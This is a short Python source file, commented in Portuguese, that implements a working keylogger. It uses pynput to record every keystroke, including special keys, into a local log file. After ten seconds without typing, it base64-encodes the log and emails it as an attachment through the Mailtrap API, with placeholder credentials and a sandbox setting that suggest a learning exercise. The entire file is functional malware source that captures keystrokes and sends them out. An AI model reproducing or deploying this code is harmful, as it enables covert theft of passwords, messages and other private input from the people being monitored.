from pynput import keyboard
import mailtrap as mt
import base64
from threading import Timer
from datetime import datetime

# Configurações
TOKEN = "<SEU_TOKEN_DO_MAILTRAP>"
INBOX_ID = "<SUA_INBOX_ID_DO_MAILTRAP>" # Inteiro. Ex.: 123456 (sem aspas)
LOG_FILE = "./keylog.txt"

# Timer global
timer = None                  # Variável que armazenará o objeto Timer ativo


def send_email():
    global LOG_FILE, TOKEN, INBOX_ID
    with open(LOG_FILE, "r") as f:
        content = f.read()

    # Cria o objeto de e-mail
    mail = mt.Mail(
        sender=mt.Address(email="keylogger@keylogger.com",
                          name="Keylogger"),
        to=[mt.Address(email="keylogger@keylogger.com")
            ],
        subject="Keylogger",
        # Corpo do e-mail com data e hora atual
        text=f"Log de {datetime.now().strftime('%d/%m/%Y - %H:%M:%S')}",
        category="Keylogger",
        # Anexo em formato .txt
        attachments=[{
            "content": base64.encodebytes(content.encode()).decode(),
            "filename": f"{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
        }],
    )

    client = mt.MailtrapClient(token=TOKEN, sandbox=True, inbox_id=INBOX_ID)
    response = client.send(mail)
    print(response)


# Função para reiniciar o timer
def reset_timer():
    global timer
    if timer is not None:
        timer.cancel()
    timer = Timer(10, send_email)
    timer.start()


def on_press(key):
    # Reinicia o timer se uma tecla for pressionada
    reset_timer()

    # Abre o arquivo em modo append (acrescentar no final)
    with open(LOG_FILE, "a") as f:
        try:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"{key.char}")
        except AttributeError:
            # Teclas especiais (Shift, Ctrl, Alt, etc.)
            f.write(f" [{key}] ".upper())


if __name__ == "__main__":
    try:
        # Cria listener para capturar teclas
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()   # Mantém o programa rodando até ser interrompido
    except KeyboardInterrupt:
        print("\nEncerrando o keylogger...")